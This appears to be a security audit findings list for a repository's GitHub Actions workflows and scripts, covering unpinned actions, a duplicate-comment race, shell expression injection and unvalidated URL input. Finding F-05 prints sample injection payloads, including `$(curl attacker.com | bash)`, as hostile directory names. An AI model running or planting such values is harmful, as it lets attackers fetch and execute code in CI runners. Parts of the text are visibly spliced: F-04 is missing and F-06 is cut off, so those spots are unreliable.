## Findings List

### F-01 — P1 · Non-SHA-pinned `googleapis/release-please-action@v4` with `contents:write` permission
**File:** `.github/workflows/release-please.yml:26`  
**Evidence:**
```yaml
- uses: googleapis/release-please-action@v4
```
with workflow-level permissions:
```yaml
permissions:
  contents: write
  pull-requests: write
  issues: write
```
**Why it's a problem:** `@v4` is a mutable tag. If the `googleapis/release-please-action` repository is compromised and the `v4` tag is force-pushed to malicious code, the next push to `main` runs that code with `contents:write` permissions — meaning it can push commits, create tags, and modify release artifacts. This is a supply-chain attack vector directly on the main branch write surface. The brief explicitly states: "third-party action pinning (must be SHA-pinned, not @v3)." The same rule applies to @v4.  
**Recommended fix:** Pin to the full commit SHA of the `v4` tag:
```yaml
- uses: googleapis/release-please-action@a02a34c4d625b9a6a234a703a43e3d88b02dc3b6  # v4.2.0
```
Verify the SHA from the action's official release tags before substituting.

### F-02 — P1 · All new actions use mutable version tags, not SHA pins
**Files:**
- `.github/workflows/danger.yml:24,27` — `actions/checkout@v6`, `actions/setup-node@v6`
- `.github/workflows/migration-dry-run.yml:58,62,81` — `actions/checkout@v6`, `actions/setup-node@v6`
- `.github/workflows/pr-checks-watcher.yml:25` — `actions/github-script@v8`
- `.github/workflows/r100-quality-gate.yml:32,87,121` — `actions/checkout@v6`
- `.github/workflows/sbom.yml:26,30,57` — `actions/checkout@v6`, `actions/setup-node@v6`, `actions/upload-artifact@v5`

**Evidence (representative):**
```yaml
# danger.yml:24
- uses: actions/checkout@v6
# sbom.yml:57
  uses: actions/upload-artifact@v5
# pr-checks-watcher.yml:25
  uses: actions/github-script@v8
```
**Why it's a problem:** Per the audit brief and standard CI security guidance, all third-party actions must be SHA-pinned, not tag-pinned. A compromised tag update (which GitHub Actions doesn't prevent) runs arbitrary code in CI. While `actions/*` (GitHub-owned) actions carry lower risk than third-party actions, the brief is explicit: "must be SHA-pinned, not @v3" — and `@v6`, `@v8` are equally mutable. Additionally, this PR introduces `@v6` for `actions/checkout` and `actions/setup-node` — which as of this audit do not correspond to any released version of these actions (latest stable is `@v4`), suggesting these tags may not currently resolve, or this project has a non-standard internal forking convention established on main. Note that `@v6` was already the pattern in `ci.yml` on `main` before this PR, so this PR follows an existing (problematic) convention rather than introducing a new one. Nonetheless, adding more instances of non-SHA-pinned actions is a finding.  
**Recommended fix:** Use `actions/checkout@<full-40-char-SHA>  # v4.x.x` for each action. Pin `actions/github-script`, `actions/upload-artifact`, `actions/setup-node` to their current SHA-tagged releases.

### F-03 — P2 · `pr-checks-watcher.yml` has no concurrency group — TOCTOU duplicate-comment race
**File:** `.github/workflows/pr-checks-watcher.yml` (entire file)  
**Evidence:** The workflow has no `concurrency:` block, while all other new workflows in this PR have one. The trigger is `check_suite:completed`, which fires once per check suite. A repo with N workflows has N check suites — the watcher fires N times per push.  
```yaml
# NO concurrency block present
on:
  check_suite:
    types: [completed]
jobs:
  comment:
    ...
    steps:
      - uses: actions/github-script@v8
        with:
          script: |
            # Race: two concurrent runs both call listComments (per_page: 100),
            # both find no existing marker comment, both call createComment.
```
**Why it's a problem:** When the CI suite for a push completes (multiple check suites fire in sequence), the watcher runs multiple times. Two simultaneous instances both pass the `comments.find((c) => c.body.startsWith(marker))` check and both call `createComment`, producing duplicate PR comments. The comment says it was designed to "fire exactly once per push" but the trigger semantics do not support that claim. The fix is standard and well-understood.  
**Recommended fix:** Add a concurrency group keyed on the PR number:
```yaml
concurrency:
  group: pr-checks-watcher-${{ github.event.check_suite.pull_requests[0].number }}
  cancel-in-progress: true
```

  "require_code_owner_reviews": false,   // <-- line 60

**Why it's a problem:** The PR introduces `CODEOWNERS` listing `@BradleyGleavePortfolio` on all paths, with the explicit goal of routing every PR through the maintainer for review. ### F-05 — P2 · `migration-dry-run.yml:128` — `${{ steps.diff.outputs.new_dirs }}` inline expansion in shell heredoc (expression injection)
**File:** `.github/workflows/migration-dry-run.yml:128`  
**Evidence:**
```yaml
done <<< "${{ steps.diff.outputs.new_dirs }}"
```
The `new_dirs` output is constructed from `git diff` output (migration directory names) via:
```bash
printf '%s\n' "${NEW[@]}" >> "$GITHUB_OUTPUT"
```
GitHub Actions template-expands `${{ steps.diff.outputs.new_dirs }}` at workflow evaluation time, before the shell runs. If a migration directory name contains shell metacharacters (e.g., `` `id` ``, `$(id)`, `$(curl attacker.com | bash)`, `'; malicious_cmd; echo '`), the heredoc expansion injects them into the shell script text.  
**Why it's a problem:** The dirs come from `git diff --name-only ... prisma/migrations/*/migration.sql | xargs -I{} dirname {}`. A contributor who can open a PR (or a compromised fork merge) can name a migration directory with shell metacharacters and achieve code execution in the CI runner. The runner has access to `GITHUB_TOKEN` and `DATABASE_URL`. In a single-contributor repo this risk is lower, but the workflow claims to handle PRs — which is the external-contributor surface.  
**Recommended fix:** Pass the value via environment variable instead of inline expression:
```yaml
env:
  NEW_DIRS: ${{ steps.diff.outputs.new_dirs }}
run: |
  while IFS= read -r dir; do
    ...
  done <<< "$NEW_DIRS"
```
Environment variable assignment is safe; it does not go through shell expansion.

### F-06 — P2 · `sbom.yml` installs `@cyclonedx/cdxgen@10` with major-only pin — supply chain risk
**File:** `.github/workflows/sbom.yml:36`  
**Evidence:**
```yaml
- name: Install @cyclonedx/cdxgen
  run: npm install --no-save --no-audit --no-fund @cyclonedx/cdxgen@10
```
**Why it's a problem:** Major version `@10` resolves to the latest 10.x.x on every run. A compromised `@cyclonedx/cdxgen` minor/patch release would execute in the runner with network access to the production `npm ci` cache and environment. Notably, `--no-audit` is passed — explicitly disabling the npm vulnerability check for this install. ```
Or use `npx @cyclonedx/cdxgen@10.x.y` with a known-good exact version, and remove `--no-audit`.

### F-07 — P3 · `dangerfile.js:73` — silently swallowed error in `diffForFile` loop
**File:** `dangerfile.js:73`  
**Evidence:**
```js
} catch (_) {
  /* file missing or binary — skip */
}
```
**Why it's a problem:** This catch block swallows all errors from `danger.git.diffForFile(f)` — not just "file missing or binary" as the comment implies. If the Danger API fails for an unexpected reason (network timeout, API rate limit, Danger internal error), the TODO/FIXME count for that file silently returns 0. The PR author gets no signal that the check was incomplete. This is functionally equivalent to the banned `.catch(()=>{})` pattern (bare swallow), differing only in that it's a sync `catch` block in a try/catch rather than a Promise `.catch`. While it doesn't trigger the R100.A2 token scan (which checks Promise `.catch` patterns in TypeScript), the spirit of the ban is violated.  
**Recommended fix:**
```js
} catch (err) {
  if (err instanceof Error && (err.message.includes('not found') || err.message.includes('binary'))) {
    continue; // expected case
  }
  core.warning(`diffForFile failed for ${f}: ${err}`);
}
```
Or at minimum: `} catch (err) { /* file missing or binary — skip: ${err.message} */ }` so errors are visible in Danger output.

### F-10 — P3 · `setup-branch-protection.sh` — `GH_REPO` is interpolated directly into the `curl` URL without validation or URL-encoding
**File:** `scripts/setup-branch-protection.sh:88`  
**Evidence:**
```bash
"https://api.github.com/repos/${GH_REPO}/branches/main/protection"
```
**Why it's a problem:** `GH_REPO` is user-supplied and is interpolated without validation into the URL path. If the user supplies `GH_REPO='owner/repo ../../../admin'` or similar, the URL is corrupted. While word-splitting is not triggered (double-quoting prevents it), a maliciously crafted `GH_REPO` value could redirect the API call to an unintended endpoint. The `: "${GH_REPO:?}"` check only verifies the variable is non-empty, not that it matches the expected `owner/repo` format.  
**Recommended fix:** Add a format check before use:
```bash
if ! printf '%s' "$GH_REPO" | grep -qE '^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$'; then
  echo "ERROR: GH_REPO must be in owner/repo format."
  exit 1
fi
```

### F-11 — P3 · `pr-checks-watcher.yml` — comment pagination hardcoded at `per_page: 100`, no pagination loop
**File:** `.github/workflows/pr-checks-watcher.yml:72`  
**Evidence:**
```js
const { data: comments } = await github.rest.issues.listComments({
  owner: context.repo.owner,
  repo: context.repo.repo,
  issue_number: pr.number,
  per_page: 100,
});
const existing = comments.find((c) => c.body && c.body.startsWith(marker));
```
**Why it's a problem:** If a PR accumulates more than 100 comments (possible on long-running PRs with multiple CI runs, review threads, Danger comments, etc.), the script only searches the first 100. If the watcher's existing comment has been pushed beyond page 1, the script fails to find it and creates a new one. Over many pushes, the PR accumulates multiple watcher comments.  
**Recommended fix:** Use `github.paginate(github.rest.issues.listComments, ...)` to retrieve all comments, or use the `github-script` action's built-in `github.paginate` helper.
